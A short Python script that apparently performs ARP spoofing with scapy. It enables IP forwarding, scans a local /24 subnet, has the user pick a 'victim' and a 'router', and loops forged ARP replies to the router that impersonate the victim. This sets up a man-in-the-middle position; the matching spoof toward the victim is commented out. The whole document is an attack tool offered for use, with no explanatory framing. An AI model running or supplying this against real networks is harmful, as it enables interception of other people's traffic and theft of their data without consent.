from scapy.all import ARP, Ether, srp
import os

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 


result = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.5.1.0/24")), timeout=3, verbose=0)[0]

print("Online IPs:")
ip=[]
mac=[]
for sent, received in result:
    ip.append(received.psrc)
    mac.append(received.hwsrc)

for i in range (len(ip)):
    print(ip[i], " = ", mac[i])

print("Chose a victim:")
victim = int(input())-1
print("Chose the router:")
router = int(input())-1

print ("Victim ip: ", ip[victim],"    Victim mac: ", mac[victim])

print ("Router ip: ", ip[router],"    Router mac: ", mac[router])

#hwsrc:mac source
#hwdst: mac dest
#psrc:ip source
#pdst:ip dest

try:
    while True:
        torouter = srp((Ether(dst=mac[router])/ARP(op = 2,pdst=ip[router], psrc=ip[victim])), timeout=3, verbose=0)
        #tovictim = srp(ARP(op = 2,psrc=(ip[router]), pdst=(ip[victim]),hwdst=(mac[victim])), verbose=True)
except KeyboardInterrupt:
    pass

    
    




    
    

    
    